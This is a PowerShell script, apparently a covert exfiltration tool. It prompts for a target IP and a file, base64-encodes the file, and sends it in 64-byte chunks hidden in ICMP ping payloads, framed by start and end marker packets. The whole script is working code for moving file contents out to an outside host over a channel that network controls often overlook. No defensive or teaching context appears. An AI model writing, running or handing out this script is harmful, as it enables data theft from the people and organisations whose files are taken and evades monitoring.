[Environment]::CurrentDirectory = $pwd

# Prompt for IP address
$IPAddress = Read-Host "Enter IP address"

# Prompt for file path
$filePath = Read-Host "Enter file path"

# Display entered values
Write-Host "Entered IP address: $IPAddress"
Write-Host "Entered file path: $filePath"

# Reading the file, encdoing to base64 and getting the bytes
$fileContents = Get-Content -Path $filePath -Raw
$base64Content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContents))

$bytes = ([text.encoding]::ASCII).GetBytes("$base64Content")
$fileLength = $bytes.Length

$chunkLength = 64

$ICMP = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $True

$sendbytes = ([text.encoding]::ASCII).GetBytes("!000000012!") # placeholder
$reply = $ICMP.Send($IPAddress, 120, $sendbytes, $PingOptions)

Write-Host "Sending $filePath to $IPAddress, please wait..."

for ($i = 0; $i -lt $fileLength; $i += $chunkLength){
    $received = $false
    while ($received -eq $false)
    {
        $endval = $i + $chunkLength - 1
        if ($i + $chunkLength -gt $fileLength)
        {
            $diff = $fileLength - $i
            $endval = $i + $diff - 1
        }
        $sendbytes = $bytes[$i..$endval]
        $reply = $ICMP.Send($IPAddress, 120, $sendbytes, $PingOptions)
        if ($reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success)
        {
            $received = $true
        }
    }
}

$sendbytes = ([text.encoding]::ASCII).GetBytes("################")
$reply = $ICMP.Send($IPAddress, 120, $sendbytes, $PingOptions)